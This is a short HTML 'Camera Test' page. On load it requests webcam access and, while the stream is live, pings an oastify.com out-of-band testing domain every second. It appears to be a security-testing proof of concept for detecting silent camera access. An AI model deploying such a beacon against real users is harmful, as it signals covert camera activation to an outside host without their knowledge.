<!DOCTYPE html>
<html>
<head>
  <title>Camera Test</title>
</head>
<body>
  <h1>Camera Test Page</h1>
  <video id="video" autoplay playsinline style="width: 400px; height: auto;"></video>

  <script>
    let stream = null;
    let pingInterval = null;

    function startCamera() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(s => {
          stream = s;
          document.getElementById('video').srcObject = stream;
          console.log("Camera access granted.");

          // Start pinging every second
          pingInterval = setInterval(() => {
            if (stream && stream.active) {
              // Send a ping to the OAST domain every second
              fetch('https://0bc1obwrqcmepy35lla01za2rtxkla9z.oastify.com/ping?' + Date.now())
                .then(() => console.log("Ping sent."))
                .catch(() => console.warn("Ping failed."));
            } else {
              clearInterval(pingInterval);
              console.log("Camera stream inactive. Stopping ping.");
            }
          }, 1000); // Every second
        })
        .catch(err => {
          console.error("Camera access denied or error:", err);
        });
    }

    // Start camera on page load
    window.onload = startCamera;
  </script>
</body>
</html>
